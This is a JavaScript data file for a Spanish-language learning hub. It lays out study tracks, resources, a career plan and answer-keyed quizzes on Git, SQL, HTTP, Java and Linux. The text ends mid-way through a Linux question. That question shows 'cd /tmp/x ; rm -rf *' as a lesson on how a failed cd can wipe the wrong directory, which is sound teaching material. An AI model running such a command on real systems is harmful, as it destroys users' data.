/* =====================================================================
   CONTENIDO DEL HUB DE APRENDIZAJE (aprender.html)
   ---------------------------------------------------------------------
   - Podés agregar temas, recursos, tareas o preguntas editando este
     archivo. Cada elemento necesita un "id" único (sin espacios).
   - free: true  → recurso gratis.   free: false → pago o con suscripción.
   - En los quizzes, "answer" es la posición de la opción correcta
     empezando en 0, y "why" es la explicación que se muestra al responder.
   ===================================================================== */

window.LEARN = {
  /* Fin de la época de parciales: hasta esta fecha el hub recomienda
     priorizar la facultad (último recuperatorio: Matemática 1, 20/11). */
  examsEnd: "2026-11-20",

  tracks: [
    { id: "fundamentos", name: "Fundamentos" },
    { id: "backend", name: "Backend" },
    { id: "redes", name: "Redes y Linux" },
    { id: "seguridad", name: "Seguridad" },
    { id: "devops", name: "Cloud y DevOps" },
    { id: "ingles", name: "Inglés" }
  ],

  /* ------------------------- TEMAS ------------------------- */
  topics: [
    {
      id: "git",
      track: "fundamentos",
      title: "Git y GitHub",
      level: "Básico",
      hours: "6–8 h",
      what: "Control de versiones: guardar el historial del código, trabajar en ramas y colaborar.",
      why: "Es lo primero que se usa en cualquier trabajo remoto. Tu portfolio, tus proyectos y tus entregas a clientes pasan por GitHub.",
      start: "Hacé los 4 primeros niveles de \"Introduction Sequence\" en Learn Git Branching. Es un juego visual: ves el árbol de commits moverse mientras escribís los comandos.",
      challenge: "Subí este portfolio a GitHub siguiendo GUIA.md. Después creá una rama `mejora-readme`, cambiá algo, abrí un Pull Request contra main y hacé el merge vos mismo.",
      resources: [
        { name: "Learn Git Branching (interactivo, en español)", url: "https://learngitbranching.js.org/?locale=es_AR", free: true },
        { name: "GitHub Skills: cursos prácticos dentro de GitHub", url: "https://skills.github.com/", free: true },
        { name: "Libro Pro Git (en español)", url: "https://git-scm.com/book/es/v2", free: true }
      ],
      quiz: "git"
    },
    {
      id: "cs50",
      track: "fundamentos",
      title: "Fundamentos de programación (CS50)",
      level: "Básico",
      hours: "60–100 h (curso completo)",
      what: "El curso introductorio de Harvard: C, memoria, algoritmos, Python, SQL y web.",
      why: "Refuerza exactamente lo que ves en Programación (vectores, búsqueda, ordenamiento) y te da base para entrevistas técnicas.",
      start: "Mirá la clase 0 (Scratch) a velocidad 1.25x y hacé el problem set 0. Son 2 a 3 horas y te da el ritmo del curso.",
      challenge: "Cuando llegues a la semana 3 (algoritmos), implementá búsqueda binaria en C++ y contá cuántas comparaciones hace para 1.000.000 elementos.",
      resources: [
        { name: "CS50x: Introduction to Computer Science (Harvard)", url: "https://cs50.harvard.edu/x/", free: true }
      ]
    },
    {
      id: "algoritmos",
      track: "fundamentos",
      title: "Algoritmos para entrevistas",
      level: "Intermedio",
      hours: "1–1,5 h por semana, continuo",
      what: "Resolver problemas con vectores, matrices, búsqueda, ordenamiento y estructuras de datos.",
      why: "Muchas entrevistas técnicas remotas incluyen un ejercicio en vivo. Lo que ves en Programación (Unidades 7 a 9) es la base.",
      start: "Resolvé \"Two Sum\" en LeetCode primero con dos for anidados y después pensá cómo hacerlo en una sola pasada. Escribí en un comentario por qué la segunda es más rápida.",
      challenge: "Hacé 2 problemas \"Easy\" por semana. Antes de programar, escribí en un papel qué entra, qué sale y qué restricciones hay.",
      resources: [
        { name: "LeetCode: problemas de práctica", url: "https://leetcode.com/problemset/", free: true },
        { name: "VisuAlgo: algoritmos animados paso a paso", url: "https://visualgo.net/es", free: true }
      ],
      quiz: "algoritmos"
    },
    {
      id: "java-spring",
      track: "backend",
      title: "Java y Spring Boot",
      level: "Intermedio",
      hours: "40–60 h",
      what: "El lenguaje y el framework de tu Sistema de Stock: APIs REST, validación, acceso a datos.",
      why: "Es tu stack principal en el portfolio y uno de los más pedidos en backend para empresas.",
      start: "Hacé la guía oficial \"Building a RESTful Web Service\" de spring.io (unos 30 minutos) y compará su estructura con la de tu Sistema de Stock.",
      challenge: "Agregale a tu Sistema de Stock un endpoint `GET /api/productos/vencidos` con un test JUnit que verifique que devuelve solo los vencidos.",
      resources: [
        { name: "Guías oficiales de Spring", url: "https://spring.io/guides", free: true },
        { name: "dev.java: aprender Java (oficial)", url: "https://dev.java/learn/", free: true },
        { name: "Baeldung: tutoriales de Spring", url: "https://www.baeldung.com/spring-boot", free: true }
      ],
      quiz: "java"
    },
    {
      id: "sql",
      track: "backend",
      title: "SQL y PostgreSQL",
      level: "Básico",
      hours: "10–15 h",
      what: "Consultar y modificar bases de datos: SELECT, JOIN, GROUP BY, índices y transacciones.",
      why: "Casi todo backend guarda datos en SQL. Además, entender SQL es requisito para entender la inyección SQL.",
      start: "Hacé las lecciones 1 a 6 de SQLBolt. Cada lección tiene ejercicios que se corrigen solos en el navegador.",
      challenge: "Escribí la consulta que devuelve, para cada producto de tu Sistema de Stock, el stock total sumando todos sus lotes no vencidos.",
      resources: [
        { name: "SQLBolt: lecciones interactivas", url: "https://sqlbolt.com/", free: true },
        { name: "PostgreSQL Tutorial", url: "https://www.postgresqltutorial.com/", free: true },
        { name: "SQL Murder Mystery: resolver un crimen con SQL", url: "https://mystery.knightlab.com/", free: true }
      ],
      quiz: "sql"
    },
    {
      id: "web",
      track: "backend",
      title: "Desarrollo web full stack",
      level: "Intermedio",
      hours: "Variable (por proyecto)",
      what: "HTML, CSS, JavaScript y cómo se conecta el frontend con una API.",
      why: "Muchos trabajos chicos de clientes son web. Saber el frontend te deja entregar proyectos completos.",
      start: "Abrí este portfolio, leé `assets/js/main.js` y buscá la función `el()`. Explicá en voz alta por qué no usa innerHTML.",
      challenge: "Agregale al portfolio un proyecto nuevo editando solo `data.js`, y verificá que aparece en el filtro correcto.",
      resources: [
        { name: "The Odin Project (full stack con proyectos)", url: "https://www.theodinproject.com/", free: true },
        { name: "MDN Web Docs (referencia, en español)", url: "https://developer.mozilla.org/es/", free: true }
      ]
    },
    {
      id: "python",
      track: "backend",
      title: "Python",
      level: "Básico",
      hours: "30–40 h",
      what: "Lenguaje muy usado para automatización, datos y seguridad (scripts).",
      why: "Te abre trabajos de automatización y es la herramienta diaria en ciberseguridad.",
      start: "Hacé el capítulo 1 de Python for Everybody en py4e.com (video + ejercicios con corrección automática).",
      challenge: "Escribí un script que lea un archivo de logs y cuente cuántas veces aparece cada código de estado HTTP (200, 404, 500).",
      resources: [
        { name: "Python for Everybody (sitio gratis)", url: "https://www.py4e.com/", free: true },
        { name: "Python for Everybody en Coursera (certificado)", url: "https://www.coursera.org/specializations/python", free: false }
      ]
    },
    {
      id: "redes",
      track: "redes",
      title: "Redes y HTTP",
      level: "Básico",
      hours: "15–20 h",
      what: "Cómo viajan los datos: IP, puertos, DNS, TCP, HTTP y HTTPS.",
      why: "Sin redes no se entiende ni el backend ni la seguridad. Es lo primero que preguntan en entrevistas de ciberseguridad.",
      start: "Abrí las herramientas de desarrollador del navegador (Cmd + Option + I), pestaña Network, y recargá este sitio. Mirá método, código de estado y headers de cada pedido.",
      challenge: "Explicá por escrito qué pasa desde que escribís una URL hasta que ves la página: DNS, TCP, TLS, pedido HTTP y respuesta.",
      resources: [
        { name: "Cisco Networking Academy (cursos introductorios)", url: "https://www.netacad.com/", free: true },
        { name: "MDN: Visión general de HTTP", url: "https://developer.mozilla.org/es/docs/Web/HTTP/Overview", free: true }
      ],
      quiz: "http"
    },
    {
      id: "linux",
      track: "redes",
      title: "Linux y línea de comandos",
      level: "Básico",
      hours: "10–15 h",
      what: "Moverse en la terminal, permisos, procesos, pipes y scripts.",
      why: "Los servidores corren Linux. En seguridad y DevOps se trabaja casi todo el día en la terminal.",
      start: "Abrí la Terminal de tu Mac y jugá los niveles 0 a 5 de OverTheWire Bandit (te conectás por SSH; cada nivel te da la contraseña del siguiente).",
      challenge: "Llegá al nivel 15 de Bandit. Anotá en un archivo qué comando nuevo aprendiste en cada nivel.",
      resources: [
        { name: "OverTheWire: Bandit (juego por niveles)", url: "https://overthewire.org/wargames/bandit/", free: true },
        { name: "TryHackMe: Linux Fundamentals", url: "https://tryhackme.com/module/linux-fundamentals", free: true }
      ],
      quiz: "linux"
    },
    {
      id: "owasp",
      track: "seguridad",
      title: "OWASP Top 10 y seguridad web",
      level: "Intermedio",
      hours: "20–30 h",
      what: "Las vulnerabilidades web más comunes: control de acceso roto, inyección, XSS, fallas criptográficas y más.",
      why: "Es la base del nicho de seguridad de aplicaciones (AppSec) y del servicio de revisión de seguridad de tu portfolio.",
      start: "Leé la página del OWASP Top 10 (unos 30 minutos) y después hacé el primer lab de SQL injection de PortSwigger.",
      challenge: "Levantá OWASP Juice Shop con Docker (`docker run -p 3000:3000 bkimminich/juice-shop`) y resolvé 3 retos de una estrella.",
      resources: [
        { name: "OWASP Top 10", url: "https://owasp.org/www-project-top-ten/", free: true },
        { name: "PortSwigger Web Security Academy (labs)", url: "https://portswigger.net/web-security", free: true },
        { name: "OWASP Cheat Sheet Series", url: "https://cheatsheetseries.owasp.org/", free: true },
        { name: "OWASP Juice Shop (app vulnerable para practicar)", url: "https://owasp.org/www-project-juice-shop/", free: true }
      ],
      quiz: "owasp"
    },
    {
      id: "soc",
      track: "seguridad",
      title: "Fundamentos de ciberseguridad y SOC",
      level: "Intermedio",
      hours: "80–150 h",
      what: "Monitoreo, detección y respuesta: logs, alertas, SIEM y marcos de referencia.",
      why: "El analista SOC nivel 1 es la puerta de entrada más común en ciberseguridad.",
      start: "Hacé la sala \"Pre Security\" de TryHackMe: introduce redes, web y Linux desde cero, con máquinas en el navegador.",
      challenge: "Abrí MITRE ATT&CK, elegí la técnica \"Phishing\" (T1566) y escribí en 5 líneas cómo la detectarías.",
      resources: [
        { name: "TryHackMe: Pre Security", url: "https://tryhackme.com/path/outline/presecurity", free: true },
        { name: "TryHackMe (ruta SOC y certificación SAL1)", url: "https://tryhackme.com/", free: false },
        { name: "Google Cybersecurity Certificate (Coursera)", url: "https://www.coursera.org/professional-certificates/google-cybersecurity", free: false },
        { name: "MITRE ATT&CK", url: "https://attack.mitre.org/", free: true },
        { name: "NIST Cybersecurity Framework", url: "https://www.nist.gov/cyberframework", free: true }
      ]
    },
    {
      id: "docker",
      track: "devops",
      title: "Docker y Docker Compose",
      level: "Intermedio",
      hours: "10–15 h",
      what: "Empaquetar una app con todo lo que necesita para que corra igual en cualquier máquina.",
      why: "Ya lo usás en el Sistema de Stock. Dominarlo es uno de tus servicios ofrecidos.",
      start: "Hacé el tutorial \"Get started\" de la documentación de Docker. Después abrí el docker-compose.yml de tu Sistema de Stock y explicá cada línea.",
      challenge: "Medí el tamaño de la imagen de tu Sistema de Stock (`docker images`). Explicá cuánto ahorra el build multi-stage frente a una imagen con el JDK completo.",
      resources: [
        { name: "Docker: Get started (oficial)", url: "https://docs.docker.com/get-started/", free: true },
        { name: "Play with Docker (laboratorio en el navegador)", url: "https://labs.play-with-docker.com/", free: true }
      ],
      quiz: "docker"
    },
    {
      id: "testing",
      track: "devops",
      title: "Tests automatizados y CI",
      level: "Intermedio",
      hours: "10–15 h",
      what: "Tests que verifican tu código solos, y GitHub Actions para correrlos en cada push.",
      why: "\"Tiene tests y CI\" es de lo que más diferencia a un junior ante un cliente.",
      start: "Mirá `.github/workflows/checks.yml` de este portfolio: ya es un CI. Después leé la sección \"Writing Tests\" de la guía de JUnit 5.",
      challenge: "Agregale a tu Sistema de Stock un test que verifique que no se puede guardar stock negativo, y un workflow que lo corra en cada push.",
      resources: [
        { name: "JUnit 5 User Guide", url: "https://junit.org/junit5/docs/current/user-guide/", free: true },
        { name: "GitHub Actions: documentación", url: "https://docs.github.com/es/actions", free: true }
      ]
    },
    {
      id: "aws",
      track: "devops",
      title: "Cloud (AWS)",
      level: "Básico",
      hours: "20–30 h",
      what: "Servicios en la nube: servidores, almacenamiento, bases de datos gestionadas y permisos (IAM).",
      why: "Muchas empresas despliegan en AWS. Cloud Practitioner es una certificación de entrada reconocida.",
      start: "Creá una cuenta en AWS Skill Builder y hacé el curso gratuito \"AWS Cloud Practitioner Essentials\".",
      challenge: "Explicá con tus palabras el modelo de responsabilidad compartida: qué protege AWS y qué te toca proteger a vos.",
      resources: [
        { name: "AWS Skill Builder (cursos oficiales)", url: "https://skillbuilder.aws/", free: true },
        { name: "AWS Certified Cloud Practitioner", url: "https://aws.amazon.com/certification/certified-cloud-practitioner/", free: false }
      ]
    },
    {
      id: "ingles",
      track: "ingles",
      title: "Inglés técnico para trabajo remoto",
      level: "Intermedio",
      hours: "20 min por día, continuo",
      what: "Leer documentación, escribir mensajes claros y sostener una entrevista o una llamada con un cliente.",
      why: "Los clientes de EE.UU., las entrevistas y la documentación son en inglés. Con un nivel intermedio ya podés empezar, pero hay que practicar la escritura y la conversación.",
      start: "Escribí el README de tu Sistema de Stock en inglés. Después leelo en voz alta como si se lo presentaras a un cliente.",
      challenge: "Grabate 2 minutos presentándote en inglés: quién sos, qué hacés y un proyecto. Escuchate y anotá 3 cosas para mejorar.",
      resources: [
        { name: "BBC Learning English", url: "https://www.bbc.co.uk/learningenglish/", free: true },
        { name: "Documentación en inglés de lo que ya usás (Spring, Docker)", url: "https://spring.io/guides", free: true }
      ],
      quiz: "ingles"
    }
  ],

  /* ------------------------- RUTA POR ETAPAS ------------------------- */
  stages: [
    {
      id: "etapa0",
      title: "Etapa 0 · Ahora → 20/11",
      subtitle: "Época de parciales: la facultad es la prioridad. Del plan remoto, solo lectura liviana.",
      tasks: [
        { id: "t0-ayso", text: "AySO: 2° parcial (27/10)" },
        { id: "t0-org", text: "Organización Empresarial: 2° parcial (05/11)" },
        { id: "t0-mate", text: "Matemática 1: 2° parcial (06/11)" },
        { id: "t0-prog", text: "Programación: 2° parcial (11/11)" },
        { id: "t0-owasp", text: "Leer el OWASP Top 10 en ratos libres (1 hora en total)", topic: "owasp" }
      ]
    },
    {
      id: "fase1",
      title: "Fase 1 · Meses 1 a 3",
      subtitle: "Base y portfolio.",
      tasks: [
        { id: "f1-git", text: "Completar \"Introduction Sequence\" de Learn Git Branching", topic: "git" },
        { id: "f1-portfolio", text: "Publicar este portfolio en GitHub Pages con tus datos reales", topic: "git" },
        { id: "f1-readmes", text: "README en inglés para 3 proyectos (empezá por el Sistema de Stock)", topic: "ingles" },
        { id: "f1-sql", text: "Terminar las lecciones de SQLBolt", topic: "sql" },
        { id: "f1-linux", text: "Llegar al nivel 15 de OverTheWire Bandit", topic: "linux" },
        { id: "f1-cs50", text: "CS50: semanas 0 a 5", topic: "cs50" },
        { id: "f1-linkedin", text: "LinkedIn y CV de una página en inglés" },
        { id: "f1-articulos", text: "Escribir 2 artículos técnicos cortos (por ejemplo, cómo dockerizaste Spring Boot)" }
      ]
    },
    {
      id: "fase2",
      title: "Fase 2 · Meses 3 a 6",
      subtitle: "Certificación y primeros clientes.",
      tasks: [
        { id: "f2-portswigger", text: "PortSwigger: labs de SQL injection y XSS de nivel Apprentice", topic: "owasp" },
        { id: "f2-juice", text: "OWASP Juice Shop: 10 retos resueltos", topic: "owasp" },
        { id: "f2-tests", text: "Tests y CI en el Sistema de Stock", topic: "testing" },
        { id: "f2-cert", text: "Rendir una certificación de entrada (ver sección Certificaciones)" },
        { id: "f2-plataformas", text: "Crear perfiles en 2 o 3 plataformas (Upwork, We Work Remotely, Remote OK, Wellfound)" },
        { id: "f2-postular", text: "Postular a 5 a 10 trabajos por semana con propuestas personalizadas" },
        { id: "f2-primer", text: "Primer proyecto pago: chico, precio fijo, entregas por hitos" }
      ]
    },
    {
      id: "fase3",
      title: "Fase 3 · Meses 6 a 12",
      subtitle: "Clientes recurrentes y nicho.",
      tasks: [
        { id: "f3-resenas", text: "Pedir reseña y referencia a cada cliente" },
        { id: "f3-nicho", text: "Elegir nicho (por ejemplo, seguridad de aplicaciones para startups)" },
        { id: "f3-auditoria", text: "Publicar una auditoría OWASP de tu propio Sistema de Stock", topic: "owasp" },
        { id: "f3-tarifa", text: "Subir la tarifa (cada 3 clientes o cada 6 meses)" },
        { id: "f3-largo", text: "Buscar un contrato de largo plazo (vía Deel o Remote)" }
      ]
    }
  ],

  /* ------------------------- BIBLIOTECA ------------------------- */
  library: [
    { id: "b-cleancode", type: "Libro", title: "Clean Code", author: "Robert C. Martin", note: "Cómo escribir código legible. Leé un capítulo y aplicalo a un proyecto tuyo." },
    { id: "b-pragmatic", type: "Libro", title: "The Pragmatic Programmer", author: "Hunt y Thomas", note: "Oficio y criterio profesional. Ideal para leer de a un tip por día." },
    { id: "b-kurose", type: "Libro", title: "Computer Networking: A Top-Down Approach", author: "Kurose y Ross", note: "Redes de verdad. Empezá por los capítulos 1 y 2 (aplicación y HTTP)." },
    { id: "b-ddia", type: "Libro", title: "Designing Data-Intensive Applications", author: "Martin Kleppmann", note: "Para cuando tengas base de backend. Es denso: de a poco." },
    { id: "b-wahh", type: "Libro", title: "The Web Application Hacker's Handbook", author: "Stuttard y Pinto", note: "Clásico de seguridad web. Algo antiguo, pero los fundamentos siguen igual." },
    { id: "v-networkchuck", type: "Video", title: "NetworkChuck", author: "YouTube", url: "https://www.youtube.com/@NetworkChuck", note: "Redes y seguridad, muy accesible." },
    { id: "v-hammond", type: "Video", title: "John Hammond", author: "YouTube", url: "https://www.youtube.com/@_JohnHammond", note: "CTFs y análisis de malware explicados." },
    { id: "v-ippsec", type: "Video", title: "IppSec", author: "YouTube", url: "https://www.youtube.com/@ippsec", note: "Resoluciones de Hack The Box: aprendés a pensar como atacante." },
    { id: "v-fireship", type: "Video", title: "Fireship", author: "YouTube", url: "https://www.youtube.com/@Fireship", note: "Tecnologías explicadas en 100 segundos." },
    { id: "p-darknet", type: "Podcast", title: "Darknet Diaries", author: "Jack Rhysider", url: "https://darknetdiaries.com/", note: "Historias reales de hacking. Suma práctica de escucha en inglés." }
  ],

  /* ------------------------- CERTIFICACIONES ------------------------- */
  certs: [
    { id: "c-google", name: "Google Cybersecurity Certificate", when: "Fase 2 · base general", url: "https://www.coursera.org/professional-certificates/google-cybersecurity", free: false },
    { id: "c-isc2", name: "ISC2 Certified in Cybersecurity (CC)", when: "Fase 2 · entrada sin experiencia", url: "https://www.isc2.org/certifications/cc", free: false },
    { id: "c-secplus", name: "CompTIA Security+", when: "Fase 2–3 · muy pedida en puestos de entrada", url: "https://www.comptia.org/certifications/security", free: false },
    { id: "c-sal1", name: "TryHackMe SAL1 (SOC nivel 1)", when: "Fase 2–3 · si vas por SOC", url: "https://tryhackme.com/", free: false },
    { id: "c-aws", name: "AWS Certified Cloud Practitioner", when: "Fase 2 · si vas por backend o cloud", url: "https://aws.amazon.com/certification/certified-cloud-practitioner/", free: false }
  ],

  /* ------------------------- PLAN SEMANAL ------------------------- */
  week: [
    { id: "lun", day: "Lunes", task: "Curso o labs (CS50, TryHackMe, PortSwigger)", hours: "2 h" },
    { id: "mar", day: "Martes", task: "Curso o labs", hours: "2 h" },
    { id: "mie", day: "Miércoles", task: "Proyecto del portfolio", hours: "2 h" },
    { id: "jue", day: "Jueves", task: "Algoritmos (LeetCode) o lectura técnica", hours: "1,5 h" },
    { id: "sab", day: "Sábado", task: "Proyecto o trabajo de cliente", hours: "3 h" },
    { id: "dom", day: "Domingo", task: "Revisión: quizzes pendientes, postulaciones y qué aprendiste", hours: "1 h" }
  ],

  /* ------------------------- QUIZZES -------------------------
     Preguntas de razonamiento: hay que seguir el código o pensar
     qué pasa, no repetir definiciones.                              */
  quizzes: {
    git: {
      title: "Git y GitHub",
      questions: [
        {
          q: "Ejecutás estos comandos en orden. ¿Qué versión de a.txt queda guardada en el commit?",
          code: "echo \"v1\" > a.txt\ngit add a.txt\necho \"v2\" > a.txt\ngit commit -m \"guardar\"",
          options: ["La que dice v2, porque es la última", "La que dice v1, la que estaba al hacer git add", "Ninguna: el commit falla", "Las dos versiones"],
          answer: 1,
          why: "git add copia el archivo al área de preparación (staging) en ese momento. El cambio a v2 ocurrió después y no está preparado, así que el commit guarda v1. Lo ves con git status: a.txt aparece como modificado otra vez."
        },
        {
          q: "Estás en main. ¿Dónde queda el commit \"login\" después de esto?",
          code: "git checkout -b feature\n# editás archivos\ngit commit -am \"login\"\ngit checkout main",
          options: ["En main y en feature", "Solo en feature, hasta que hagas merge", "Se pierde al volver a main", "Solo en main"],
          answer: 1,
          why: "Una rama es un puntero a un commit. El commit se creó con feature activa, así que solo esa rama avanza. main sigue donde estaba hasta que hagas git merge feature."
        },
        {
          q: "Subiste por error un archivo .env con una API key a un repo público. Hacés un commit nuevo que lo borra. ¿Qué es lo primero que tenés que hacer?",
          options: ["Nada: el archivo ya no está", "Hacer el repo privado", "Revocar la clave y generar una nueva", "Hacer git push --force"],
          answer: 2,
          why: "El archivo sigue en el historial y hay bots que escanean GitHub en minutos buscando claves. Asumí que la clave está comprometida: revocala primero. Limpiar el historial es un paso posterior, y no sirve si alguien ya la copió."
        },
        {
          q: "¿Cuál es la diferencia entre git fetch y git pull?",
          options: [
            "Son lo mismo",
            "fetch descarga los cambios del remoto sin tocar tu rama; pull descarga y además integra (merge o rebase)",
            "fetch sube cambios y pull los baja",
            "pull solo funciona con ramas nuevas"
          ],
          answer: 1,
          why: "git pull = git fetch + integrar. Con fetch podés revisar qué cambió (git log origin/main) antes de mezclarlo con tu trabajo, lo que evita sorpresas."
        }
      ]
    },

    algoritmos: {
      title: "Algoritmos (C++)",
      questions: [
        {
          q: "¿Qué imprime este código?",
          code: "int v[5] = {5, 2, 8, 1, 9};\nint m = v[0];\nfor (int i = 1; i < 5; i++)\n    if (v[i] < m) m = v[i];\ncout << m;",
          options: ["5", "1", "9", "2"],
          answer: 1,
          why: "Es el patrón de búsqueda del mínimo: m arranca en 5, pasa a 2 (2 < 5), queda en 2 con el 8, pasa a 1 (1 < 2) y queda en 1 con el 9."
        },
        {
          q: "Búsqueda binaria de 11 en {1, 3, 5, 7, 9, 11, 13} con medio = (inicio + fin) / 2. ¿Cuántas comparaciones con un elemento hace hasta encontrarlo?",
          options: ["1", "2", "3", "6"],
          answer: 1,
          why: "Primera: inicio 0, fin 6, medio 3 → v[3] = 7 < 11, así que inicio = 4. Segunda: medio (4 + 6) / 2 = 5 → v[5] = 11, encontrado. Son 2 comparaciones."
        },
        {
          q: "Aplicás UNA pasada de burbujeo ascendente (comparar e intercambiar vecinos de izquierda a derecha) a {4, 3, 2, 1}. ¿Cómo queda el vector?",
          options: ["{1, 2, 3, 4}", "{3, 2, 1, 4}", "{3, 4, 2, 1}", "{4, 3, 2, 1}"],
          answer: 1,
          why: "El 4 se compara con cada vecino y se intercambia siempre: {3,4,2,1} → {3,2,4,1} → {3,2,1,4}. Cada pasada lleva el mayor al final, por eso se necesitan n − 1 pasadas."
        },
        {
          q: "En un vector ordenado de 1.000.000 de elementos, ¿cuántas comparaciones hace como máximo la búsqueda binaria?",
          options: ["Unas 20", "Unas 1.000", "Unas 500.000", "1.000.000"],
          answer: 0,
          why: "Cada comparación descarta la mitad: 2^20 ≈ 1.048.576, así que en unas 20 comparaciones el rango queda en 1 elemento. La búsqueda secuencial puede necesitar 1.000.000. Por eso conviene ordenar si vas a buscar muchas veces."
        },
        {
          q: "¿Qué imprime este código?",
          code: "int m[2][3] = {{1, 2, 3}, {4, 5, 6}};\nint s = 0;\nfor (int j = 0; j < 3; j++)\n    s += m[1][j] - m[0][j];\ncout << s;",
          options: ["3", "6", "9", "21"],
          answer: 2,
          why: "Recorre las columnas restando fila 1 menos fila 0: (4 − 1) + (5 − 2) + (6 − 3) = 3 + 3 + 3 = 9."
        }
      ]
    },

    java: {
      title: "Java y Spring Boot",
      questions: [
        {
          q: "¿Qué imprime este código?",
          code: "int[] v = {3, 1, 4};\nint[] w = v;\nw[0] = 9;\nSystem.out.println(v[0]);",
          options: ["3", "9", "Error de compilación", "0"],
          answer: 1,
          why: "Los arrays son objetos: w = v copia la referencia, no los datos. v y w apuntan al mismo array, así que modificar w[0] cambia v[0]. Para copiar los datos se usa v.clone() o Arrays.copyOf."
        },
        {
          q: "¿Qué imprime este código?",
          code: "String a = \"hola\";\nString b = new String(\"hola\");\nSystem.out.println(a == b);\nSystem.out.println(a.equals(b));",
          options: ["true / true", "false / true", "true / false", "false / false"],
          answer: 1,
          why: "== compara referencias (si son el mismo objeto) y new String crea un objeto distinto, por eso da false. equals compara el contenido, por eso da true. En Java los Strings se comparan siempre con equals."
        },
        {
          q: "¿Qué valor queda en x?",
          code: "int x = 7 / 2 * 2;",
          options: ["7", "6", "8", "3"],
          answer: 1,
          why: "7 / 2 entre enteros da 3 (se trunca), y 3 * 2 = 6. Es un error clásico al calcular promedios: hay que convertir a double antes de dividir."
        },
        {
          q: "¿Qué imprime este código?",
          code: "for (int i = 0; i < 5; i++) {\n    if (i % 2 == 0) continue;\n    System.out.print(i);\n}",
          options: ["024", "13", "01234", "1234"],
          answer: 1,
          why: "continue salta al siguiente ciclo cuando i es par (0, 2, 4). Solo se imprimen los impares: 1 y 3."
        },
        {
          q: "En tu Sistema de Stock, el formulario HTML ya impide cargar stock negativo con min=\"0\". ¿Hace falta validarlo también en Spring Boot?",
          options: [
            "No: el navegador ya lo valida",
            "Sí: cualquiera puede llamar a la API directamente (curl, Postman) y saltear el formulario",
            "Solo si la app tiene login",
            "No: PostgreSQL lo rechaza automáticamente"
          ],
          answer: 1,
          why: "La validación del navegador es comodidad para el usuario, no seguridad. La API recibe pedidos de cualquier cliente. Validá en el servidor (@Min(0) más @Valid, o en el servicio). PostgreSQL solo lo rechaza si definiste un CHECK."
        }
      ]
    },

    sql: {
      title: "SQL",
      intro: "Todas las preguntas usan esta tabla productos: (1, 'Yerba', 10), (2, 'Café', 0), (3, 'Té', NULL), con columnas id, nombre y stock.",
      questions: [
        {
          q: "¿Qué devuelve esta consulta?",
          code: "SELECT COUNT(*) FROM productos WHERE stock > 0;",
          options: ["0", "1", "2", "3"],
          answer: 1,
          why: "Solo Yerba cumple stock > 0. Café tiene 0 y Té tiene NULL: cualquier comparación con NULL da \"desconocido\" y la fila no pasa el WHERE."
        },
        {
          q: "¿Qué devuelve esta consulta?",
          code: "SELECT COUNT(stock) FROM productos;",
          options: ["3", "2", "1", "NULL"],
          answer: 1,
          why: "COUNT(columna) cuenta solo los valores no nulos: 10 y 0. COUNT(*) cuenta filas y daría 3."
        },
        {
          q: "¿Qué nombres devuelve esta consulta?",
          code: "SELECT nombre FROM productos WHERE stock <> 0;",
          options: ["Yerba y Té", "Solo Yerba", "Yerba, Café y Té", "Ninguno"],
          answer: 1,
          why: "NULL <> 0 no es verdadero, es desconocido, así que Té no aparece. Para incluirlo: WHERE stock <> 0 OR stock IS NULL."
        },
        {
          q: "¿Qué devuelve esta consulta?",
          code: "SELECT SUM(stock) FROM productos;",
          options: ["NULL", "10", "Error", "11"],
          answer: 1,
          why: "Las funciones de agregación ignoran los NULL: SUM suma 10 + 0 = 10. Solo devolvería NULL si todos los valores fueran NULL."
        }
      ]
    },

    http: {
      title: "Redes y HTTP",
      questions: [
        {
          q: "Un usuario logueado como comprador pide GET /admin y no tiene permiso. ¿Qué código debería devolver la API?",
          options: ["401 Unauthorized", "403 Forbidden", "404 Not Found", "500 Internal Server Error"],
          answer: 1,
          why: "401 significa \"no sé quién sos\" (falta autenticarse). 403 significa \"sé quién sos y no tenés permiso\". Acá el usuario está identificado, así que corresponde 403."
        },
        {
          q: "El cliente reintenta un pedido por un timeout. Si la API está bien implementada, ¿cuál de estos métodos se puede repetir sin crear duplicados?",
          options: ["POST /pedidos", "PUT /productos/7", "Ninguno", "Todos"],
          answer: 1,
          why: "PUT es idempotente: enviarlo una o diez veces deja el recurso 7 en el mismo estado. POST suele crear un recurso nuevo por cada llamada, así que un reintento puede duplicar el pedido."
        },
        {
          q: "Tu sitio usa HTTPS correctamente. ¿De cuál de estos problemas NO te protege?",
          options: ["Que alguien en el Wi-Fi del bar lea las contraseñas", "Que alguien modifique la respuesta en el camino", "Una inyección SQL en tu API", "Que alguien vea el contenido de los pedidos en tránsito"],
          answer: 2,
          why: "HTTPS cifra y protege los datos en tránsito entre el navegador y el servidor. Una inyección SQL viaja dentro de un pedido HTTPS perfectamente válido: el problema está en tu código, no en la conexión."
        },
        {
          q: "Escribís ejemplo.com en el navegador. ¿Qué pasa primero?",
          options: ["Se envía el pedido HTTP GET", "Se resuelve el nombre a una IP con DNS", "Se negocia TLS", "El servidor responde con el HTML"],
          answer: 1,
          why: "El orden es: DNS (nombre → IP), conexión TCP, handshake TLS (si es HTTPS), pedido HTTP y respuesta. Sin la IP no hay a dónde conectarse."
        }
      ]
    },

    linux: {
      title: "Linux y terminal",
      questions: [
        {
          q: "¿Qué contiene el archivo f después de estos comandos?",
          code: "echo a > f\necho b > f\necho c >> f",
          options: ["a, b y c", "b y c", "solo c", "a y c"],
          answer: 1,
          why: "> sobrescribe el archivo y >> agrega al final. El segundo echo borra la \"a\" y deja \"b\"; el tercero agrega \"c\" debajo."
        },
        {
          q: "¿Qué cuenta este comando?",
          code: "cat access.log | grep 404 | wc -l",
          options: [
            "Solo las respuestas con código de estado 404",
            "Las líneas que contienen \"404\" en cualquier parte",
            "La cantidad de palabras \"404\"",
            "Los bytes del archivo"
          ],
          answer: 1,
          why: "grep busca el texto en cualquier parte de la línea: también encuentra un 404 dentro de una IP, una URL o la cantidad de bytes. wc -l cuenta líneas. Para filtrar solo por la columna de estado usás awk, por ejemplo awk '$9 == 404'."
        },
        {
          q: "Ejecutás chmod 640 secreto.txt. ¿Quién puede leer el archivo?",
          options: ["Todos", "El dueño y su grupo", "Solo el dueño", "Nadie"],
          answer: 1,
          why: "Cada dígito es dueño / grupo / otros, con r = 4, w = 2, x = 1. 6 = rw para el dueño, 4 = r para el grupo, 0 = nada para los demás."
        },
        {
          q: "La carpeta /tmp/x NO existe. ¿Qué pasa con cada comando?",
          code: "# A\ncd /tmp/x && rm -rf *\n# B\ncd /tmp/x ;  rm -rf *",
          options: [
            "Los dos borran /tmp/x",
